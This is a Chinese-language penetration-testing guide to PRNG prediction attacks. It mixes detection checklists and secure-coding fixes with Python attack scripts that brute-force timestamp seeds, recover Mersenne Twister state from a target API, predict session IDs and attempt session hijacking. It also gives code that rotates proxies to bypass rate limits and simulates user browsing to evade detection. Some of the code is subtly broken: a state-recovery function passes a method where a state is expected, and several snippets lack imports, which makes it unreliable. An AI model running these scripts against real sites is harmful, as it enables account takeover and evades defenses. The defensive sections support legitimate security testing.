# 随机数预测攻击

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供随机数预测攻击的系统性方法论。通过本指南，测试人员可以检测目标系统中伪随机数生成器（PRNG）的弱点，预测未来生成的随机数，从而绕过安全机制。

### 1.2 适用范围
本文档适用于以下场景：
- 使用弱 PRNG 的会话 ID 生成
- 可预测的密码重置令牌
- 时间戳种子的随机数生成
- 验证码、OTP 生成系统
- 加密密钥、IV、Nonce 生成

### 1.3 读者对象
- 渗透测试工程师
- 安全研究员
- 代码审计人员
- 密码学安全测试人员

---

## 第二部分：核心渗透技术专题

### 专题一：随机数预测攻击

#### 2.1 技术介绍

**随机数预测攻击**是针对伪随机数生成器（PRNG）的攻击技术。由于计算机无法生成真正的随机数，只能使用算法生成"伪随机数"，如果 PRNG 实现不当或种子可预测，攻击者可以推算出未来的随机数值。

**CWE 映射：**

| CWE 编号 | 描述 | 风险等级 |
|---------|------|---------|
| CWE-330 | 使用不足够随机的值 | 严重 |
| CWE-331 | 熵不足 | 严重 |
| CWE-332 | PRNG 熵不足 | 高危 |
| CWE-335 | PRNG 种子使用不正确 | 高危 |
| CWE-336 | PRNG 相同种子 | 高危 |
| CWE-337 | PRNG 可预测种子 | 高危 |
| CWE-338 | 使用密码学弱 PRNG | 严重 |
| CWE-340 | 生成可预测的数字或标识符 | 高危 |
| CWE-1241 | 随机数生成器中使用可预测算法 | 高危 |

**常见 PRNG 弱点：**

| 弱点类型 | 描述 | 风险等级 | CWE 映射 |
|---------|------|---------|---------|
| 弱种子源 | 使用时间戳、PID 等可预测值作为种子 | 严重 | CWE-335, CWE-337 |
| 熵不足 | 种子来源熵值不足 | 严重 | CWE-331, CWE-332 |
| 状态泄露 | PRNG 内部状态被暴露 | 严重 | CWE-330 |
| 算法缺陷 | 使用有缺陷的随机算法（如 rand()） | 高危 | CWE-338, CWE-1241 |
| 种子空间小 | 种子熵值不足，可暴力枚举 | 高危 | CWE-334 |
| 相同种子 | 多个实例使用相同种子 | 高危 | CWE-336 |
| 并发问题 | 多线程/进程共享 PRNG 状态 | 中危 | CWE-330 |

**常见弱 PRNG 示例：**
```python
# ❌ Python - random 模块（不安全）
import random
token = random.randint(100000, 999999)  # 可预测

# ✅ Python - secrets 模块（安全）
import secrets
token = secrets.token_hex(16)  # 不可预测

# ❌ Java - Random（不安全）
Random rand = new Random();
int token = rand.nextInt();  // 可预测

# ✅ Java - SecureRandom（安全）
SecureRandom rand = new SecureRandom();
byte[] token = new byte[16];
rand.nextBytes(token);  // 不可预测
```

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 用户认证 | Session ID、Token 生成 | 使用弱 PRNG 生成会话标识 |
| 密码重置 | 重置令牌、验证码 | 令牌可预测导致账户接管 |
| 双因素认证 | TOTP、OTP 生成 | 种子泄露或算法可预测 |
| 支付系统 | 交易 ID、订单号 | 可预测导致交易伪造 |
| 抽奖系统 | 随机抽奖、彩票 | 结果可预测导致作弊 |
| 验证码 | 图形验证码、短信验证码 | 验证码可预测绕过验证 |
| CSRF 保护 | CSRF Token 生成 | Token 可预测绕过保护 |
| 文件上传 | 随机文件名生成 | 文件名可预测导致覆盖/访问 |

#### 2.3 漏洞发现方法

##### 2.3.1 黑盒测试

**步骤 1：收集随机数样本**
```bash
# 收集多个 Session ID 或 Token
for i in {1..100}; do
    curl -s -c - "https://target.com/login" | grep session_id
    sleep 0.1
done > tokens.txt

# 或使用 Burp Suite 的 Session History 收集
```

**步骤 2：分析随机数质量**
```bash
# 使用 ent 工具分析熵值
ent tokens.txt

# 输出示例：
# Entropy = 3.921456 bits per byte  # 应接近 8
# Chi-square = 1234.56              # 应接近 256
# Arithmetic Mean = 127.34          # 应接近 127.5
```

**步骤 3：使用 Burp Sequencer**
```
1. 打开 Burp Suite → Sequencer 标签
2. 配置目标：选择包含随机 Token 的请求
3. 选择 Token 位置：从响应中选择 Session ID
4. 开始捕获：收集至少 1000 个样本
5. 分析结果：查看熵值和时间序列分析
```

**步骤 4：检测时间戳种子**
```python
#!/usr/bin/env python3
"""
检测随机数是否基于时间戳种子
"""
import time
import hashlib
import requests

def timestamp_seed_attack(target_url, token_location='cookie'):
    """尝试用时间戳预测随机数"""
    
    # 获取当前 Token
    if token_location == 'cookie':
        resp = requests.get(target_url)
        current_token = resp.cookies.get('session_id')
    else:
        resp = requests.get(target_url)
        current_token = resp.json().get('token')
    
    print(f"[*] 当前 Token: {current_token}")
    
    # 尝试前后 60 秒的时间戳
    current_time = int(time.time())
    
    for offset in range(-60, 61):
        seed = current_time + offset
        # 假设 Token 是 MD5(时间戳) 的前 16 位
        guess = hashlib.md5(str(seed).encode()).hexdigest()[:16]
        
        if guess == current_token:
            print(f"[+] 找到种子！时间戳：{seed}")
            return seed
    
    print("[-] 未找到时间戳种子")
    return None
```

##### 2.3.2 白盒测试

**检查 PRNG 实现：**
```python
# ❌ 不安全 - 使用 random 模块生成安全 Token
import random

def generate_token():
    return str(random.randint(100000, 999999))

# ❌ 不安全 - 时间戳种子
import random
random.seed(int(time.time()))
token = random.getrandbits(64)

# ❌ 不安全 - PID 种子
import random
random.seed(os.getpid())
token = random.getrandbits(64)

# ✅ 安全 - 使用 secrets 模块
import secrets
token = secrets.token_urlsafe(32)

# ✅ 安全 - 使用 os.urandom
import os
token = os.urandom(32).hex()
```

```java
// ❌ 不安全 - Java Random
import java.util.Random;
Random rand = new Random();  // 默认使用时间戳种子
String token = Long.toString(rand.nextLong());

// ❌ 不安全 - 固定种子
Random rand = new Random(12345);  // 完全可预测

// ✅ 安全 - SecureRandom
import java.security.SecureRandom;
SecureRandom rand = new SecureRandom();
byte[] token = new byte[32];
rand.nextBytes(token);
```

```php
// ❌ 不安全 - PHP rand()/mt_rand()
$token = mt_rand(100000, 999999);

// ❌ 不安全 - 时间戳
$token = md5(time());

// ✅ 安全 - random_bytes()
$token = bin2hex(random_bytes(32));

// ✅ 安全 - openssl_random_pseudo_bytes()
$token = bin2hex(openssl_random_pseudo_bytes(32));
```

#### 2.4 漏洞利用方法

##### 2.4.1 Python random 模块状态恢复

```python
#!/usr/bin/env python3
"""
Python random 模块状态恢复攻击
random 模块使用 Mersenne Twister，624 个输出后可预测后续所有值
"""
import random
import time

class RandomStateAttack:
    def __init__(self):
        self.outputs = []
    
    def collect_outputs(self, get_token_func, count=624):
        """收集 624 个随机数输出"""
        print(f"[*] 收集 {count} 个随机数样本...")
        for i in range(count):
            token = get_token_func()
            # 假设 token 是 32 位整数
            self.outputs.append(int(token))
            print(f"    已收集 {i+1}/{count}")
    
    def predict_next(self):
        """预测下一个随机数"""
        # 恢复内部状态
        state = self.recover_state()
        
        # 创建具有相同状态的 PRNG
        prng = random.Random()
        prng.setstate(state)
        
        # 预测下一个值
        return prng.randint(0, 2**32 - 1)
    
    def recover_state(self):
        """从输出恢复 MT19937 内部状态"""
        # 实现 MT19937 状态恢复算法
        # 这里简化处理，实际需要使用专门库如 randcrack
        from randcrack import RandCrack
        
        rc = RandCrack()
        for output in self.outputs[:624]:
            rc.submit(output)
        
        return rc.getrandbits

# 使用示例
attack = RandomStateAttack()

def get_token():
    resp = requests.get("https://target.com/api/token")
    return resp.json()['token']

attack.collect_outputs(get_token)
next_value = attack.predict_next()
print(f"[+] 预测下一个随机数：{next_value}")
```

##### 2.4.2 时间戳种子爆破

```python
#!/usr/bin/env python3
"""
时间戳种子爆破攻击
适用于使用 time() 作为种子的 PRNG
"""
import random
import hashlib
from datetime import datetime

def bruteforce_timestamp_token(token, token_format='md5_prefix'):
    """
    爆破基于时间戳的 Token
    
    token_format:
    - 'md5_prefix': MD5(时间戳) 前 16 位
    - 'sha1_prefix': SHA1(时间戳) 前 16 位
    - 'random_int': random.randint() 直接输出
    """
    
    # 获取当前时间
    current_time = int(datetime.now().timestamp())
    
    # 搜索前后 24 小时
    for offset in range(-86400, 86401):
        seed = current_time + offset
        
        if token_format == 'md5_prefix':
            guess = hashlib.md5(str(seed).encode()).hexdigest()[:16]
        elif token_format == 'sha1_prefix':
            guess = hashlib.sha1(str(seed).encode()).hexdigest()[:16]
        elif token_format == 'random_int':
            random.seed(seed)
            guess = str(random.randint(100000, 999999))
        else:
            raise ValueError(f"Unknown format: {token_format}")
        
        if guess == token:
            print(f"[+] 找到种子！")
            print(f"    时间戳：{seed}")
            print(f"    时间：{datetime.fromtimestamp(seed)}")
            return seed
    
    print("[-] 未找到匹配的种子")
    return None

# 使用示例
token = "5f4dcc3b5aa765"  # 目标 Token
bruteforce_timestamp_token(token, 'md5_prefix')
```

##### 2.4.3 Session ID 预测

```python
#!/usr/bin/env python3
"""
Session ID 预测攻击
针对使用弱 PRNG 生成 Session ID 的应用
"""
import requests
import re
from collections import Counter

class SessionPredictor:
    def __init__(self, target_url):
        self.target_url = target_url
        self.sessions = []
    
    def collect_sessions(self, count=100):
        """收集 Session ID 样本"""
        print(f"[*] 收集 {count} 个 Session ID...")
        for i in range(count):
            resp = requests.get(self.target_url)
            session_id = resp.cookies.get('PHPSESSID') or resp.cookies.get('session_id')
            if session_id:
                self.sessions.append(session_id)
            print(f"    已收集 {len(self.sessions)} 个")
    
    def analyze_patterns(self):
        """分析 Session ID 模式"""
        print("\n[*] 分析 Session ID 模式...")
        
        # 检查长度
        lengths = [len(s) for s in self.sessions]
        print(f"    长度：{Counter(lengths)}")
        
        # 检查字符集
        all_chars = set(''.join(self.sessions))
        print(f"    字符集：{all_chars}")
        
        # 检查是否全为数字（可能是随机数）
        if all(c.isdigit() for s in self.sessions for c in s):
            print("    [!] 发现：Session ID 全为数字，可能是随机数生成")
        
        # 检查是否全为十六进制
        if all(c in '0123456789abcdef' for s in self.sessions for c in s.lower()):
            print("    [!] 发现：Session ID 为十六进制，可能是 bin2hex(random_bytes())")
    
    def predict_next(self):
        """尝试预测下一个 Session ID"""
        # 简单策略：分析增量模式
        if len(self.sessions) < 10:
            print("[-] 样本不足，无法预测")
            return None
        
        # 转换为整数分析（如果是数字 Session）
        try:
            int_sessions = [int(s) for s in self.sessions]
            diffs = [int_sessions[i+1] - int_sessions[i] 
                     for i in range(len(int_sessions)-1)]
            
            # 检查是否有固定增量
            if len(set(diffs)) == 1:
                print(f"[+] 发现固定增量：{diffs[0]}")
                next_val = int_sessions[-1] + diffs[0]
                print(f"[+] 预测下一个 Session ID: {next_val}")
                return str(next_val)
        except:
            pass
        
        print("[-] 无法预测下一个 Session ID")
        return None
    
    def hijack_session(self, predicted_session):
        """使用预测的 Session ID 尝试劫持"""
        cookies = {'session_id': predicted_session}
        resp = requests.get(self.target_url, cookies=cookies)
        
        if resp.status_code == 200 and 'logout' in resp.text.lower():
            print("[+] Session 劫持成功！")
            return resp.cookies
        else:
            print("[-] Session 劫持失败")
            return None

# 使用示例
# predictor = SessionPredictor("https://target.com/")
# predictor.collect_sessions(100)
# predictor.analyze_patterns()
# predicted = predictor.predict_next()
# if predicted:
#     predictor.hijack_session(predicted)
```

##### 2.4.4 密码重置令牌预测

```python
#!/usr/bin/env python3
"""
密码重置令牌预测攻击
"""
import requests
import time

def password_reset_token_attack(target_url, email):
    """
    攻击密码重置流程

    1. 请求密码重置
    2. 分析令牌生成模式
    3. 预测有效令牌
    """

    # 步骤 1: 收集令牌样本（需要能够访问邮件或响应中包含令牌）
    tokens = []
    for i in range(10):
        requests.post(f"{target_url}/reset", data={'email': email})
        # 假设令牌在响应中或通过其他方式获取
        # 实际场景中可能需要访问邮件系统
        time.sleep(1)

    # 步骤 2: 分析令牌模式
    # - 检查长度、字符集、时间相关性

    # 步骤 3: 生成预测令牌
    # 基于分析结果生成可能的令牌

    print("[*] 密码重置令牌分析完成")
    print("[!] 实际攻击需要结合具体实现细节")

# 常见弱令牌生成模式：
# 1. MD5(email + timestamp) - 可爆破时间戳
# 2. base64(email) - 完全可预测
# 3. random(1000000) - 可爆破
```

##### 2.4.5 CWE-338 弱 PRNG 利用案例

```python
#!/usr/bin/env python3
"""
CWE-338: 使用密码学弱 PRNG 的利用案例
"""
import subprocess

def cwe338_exploit_scenarios():
    """
    CWE-338 弱 PRNG 利用场景
    """

    print("""
    场景 1: Java Random 用于会话 ID 生成

    漏洞代码:
    ```java
    // ❌ 不安全 - 使用 java.util.Random
    Random random = new Random();
    String sessionId = Long.toString(random.nextLong());
    ```

    利用方法:
    1. 收集多个 Session ID
    2. 使用 Random 状态恢复工具
    3. 预测下一个 Session ID
    4. 劫持用户会话

    工具:
    - Java Random 预测器
    - 自定义脚本恢复内部状态

    修复:
    ```java
    // ✅ 安全 - 使用 SecureRandom
    SecureRandom random = new SecureRandom();
    byte[] token = new byte[32];
    random.nextBytes(token);
    String sessionId = bytesToHex(token);
    ```
    """)

    print("""
    场景 2: PHP mt_rand() 用于令牌生成

    漏洞代码:
    ```php
    // ❌ 不安全 - mt_rand() 不是加密安全的
    $token = mt_rand(100000, 999999);
    ```

    利用方法:
    1. mt_rand() 使用 Mersenne Twister
    2. 收集 624 个输出可恢复内部状态
    3. 预测所有后续输出
    4. 使用 php_mt_seed 工具爆破种子

    工具:
    ```bash
    # 使用 php_mt_seed 爆破种子
    php_mt_seed 123456

    # 使用 randcrack (Python)
    pip install randcrack
    ```

    修复:
    ```php
    // ✅ 安全 - 使用 random_bytes()
    $token = bin2hex(random_bytes(32));
    ```
    """)

    print("""
    场景 3: JavaScript Math.random() 用于令牌

    漏洞代码:
    ```javascript
    // ❌ 不安全 - Math.random() 不是加密安全的
    const token = Math.random().toString(36).substring(2);
    ```

    利用方法:
    1. Math.random() 通常使用 XORShift128+
    2. 收集足够输出可恢复状态
    3. 预测后续随机数
    4. 某些浏览器实现可被预测

    修复:
    ```javascript
    // ✅ 安全 - 使用 crypto.getRandomValues()
    const array = new Uint8Array(32);
    crypto.getRandomValues(array);
    const token = Array.from(array, b => b.toString(16).padStart(2, '0')).join('');
    ```
    """)

    print("""
    场景 4: Python random 用于安全令牌

    漏洞代码:
    ```python
    # ❌ 不安全 - random 模块不是加密安全的
    import random
    token = str(random.randint(100000, 999999))
    ```

    利用方法:
    1. random 模块使用 Mersenne Twister
    2. 624 个连续输出可完全恢复状态
    3. 使用 randcrack 工具恢复状态
    4. 预测所有后续输出

    工具:
    ```python
    from randcrack import RandCrack

    rc = RandCrack()
    for i in range(624):
        rc.submit(random.getrandbits(32))

    # 现在可以预测
    print(rc.predict_getrandbits(32))
    ```

    修复:
    ```python
    # ✅ 安全 - 使用 secrets 模块
    import secrets
    token = secrets.token_urlsafe(32)
    ```
    """)

def cwe338_detection_checklist():
    """
    CWE-338 检测检查清单
    """

    print("""
    CWE-338 检测检查清单:

    代码审计:
    [ ] 搜索非加密 PRNG 使用
        - Python: random, numpy.random
        - Java: java.util.Random, Math.random()
        - JavaScript: Math.random()
        - PHP: rand(), mt_rand()
        - C/C++: rand(), random()
        - Ruby: Random, rand()
        - Go: math/rand
        - .NET: System.Random

    [ ] 检查 PRNG 使用场景
        - 会话 ID 生成
        - 密码重置令牌
        - CSRF Token
        - 加密密钥/IV 生成
        - 验证码生成

    [ ] 检查种子来源
        - 是否使用时间戳
        - 是否使用 PID
        - 是否使用固定值
        - 熵值是否充足

    动态测试:
    [ ] 收集随机数样本
    [ ] 分析随机性质量
    [ ] 尝试状态恢复
    [ ] 验证预测准确性
    """)

# 使用示例
# cwe338_exploit_scenarios()
# cwe338_detection_checklist()
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 绕过速率限制

```python
# 当目标有请求速率限制时
# 方法 1: 分布式收集
# 方法 2: 延长收集时间
# 方法 3: 使用多个 IP/代理

def rate_limit_bypass(target_url, proxies):
    """使用代理池绕过速率限制"""
    import itertools
    
    proxy_pool = itertools.cycle(proxies)
    tokens = []
    
    for i in range(100):
        try:
            proxy = {"http": next(proxy_pool), "https": next(proxy_pool)}
            resp = requests.get(target_url, proxies=proxy, timeout=5)
            token = resp.cookies.get('session_id')
            if token:
                tokens.append(token)
        except:
            continue
        
        # 随机延迟
        time.sleep(random.uniform(0.5, 2.0))
    
    return tokens
```

##### 2.5.2 绕过熵值检测

```python
# 当服务器检测请求异常时
# 方法：模拟正常用户行为模式

def simulate_user_behavior(base_url):
    """模拟正常用户浏览行为"""
    session = requests.Session()
    
    # 正常用户访问路径
    pages = [
        '/',
        '/about',
        '/products',
        '/contact',
        '/login'
    ]
    
    for page in pages:
        session.get(f"{base_url}{page}")
        time.sleep(random.uniform(1, 5))  # 模拟阅读时间
    
    # 最后请求目标 Token
    resp = session.get(f"{base_url}/api/token")
    return resp.cookies.get('session_id')
```

---

## 第三部分：附录

### 3.1 常用 Payload 速查表

| 类别 | 命令/代码 | 说明 |
|-----|----------|------|
| 分析 | `ent tokens.txt` | 熵值分析 |
| 分析 | Burp Sequencer | 图形化随机性分析 |
| 攻击 | `randcrack` | Python random 状态恢复 |
| 攻击 | 时间戳爆破 | 针对 time() 种子 |
| 工具 | `john --format=raw-md5` | Token 哈希爆破 |

### 3.2 安全 PRNG 选择指南

| 语言 | 不安全 PRNG | 安全 PRNG |
|------|-----------|----------|
| Python | `random` | `secrets`, `os.urandom` |
| Java | `Random` | `SecureRandom` |
| PHP | `rand()`, `mt_rand()` | `random_bytes()`, `openssl_random_pseudo_bytes()` |
| JavaScript | `Math.random()` | `crypto.randomBytes()` |
| C# | `Random` | `RNGCryptoServiceProvider` |
| Go | `math/rand` | `crypto/rand` |
| Ruby | `Random` | `SecureRandom` |

### 3.3 随机数安全检测清单

- [ ] 是否使用加密安全的 PRNG
- [ ] 种子来源是否有足够熵
- [ ] 是否避免使用时间戳作为唯一种子
- [ ] PRNG 状态是否被泄露
- [ ] 并发访问是否安全
- [ ] Token 长度是否足够（至少 128 位）
- [ ] 是否有 Token 重用保护

---

## 参考资源

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [Random Number Generator Security](https://en.wikipedia.org/wiki/Random_number_generator_security)
- [Burp Suite Sequencer Documentation](https://portswigger.net/burp/documentation/desktop/tools/sequencer)
- [randcrack - Python PRNG cracker](https://github.com/tna0y/Python-random-module-cracker)
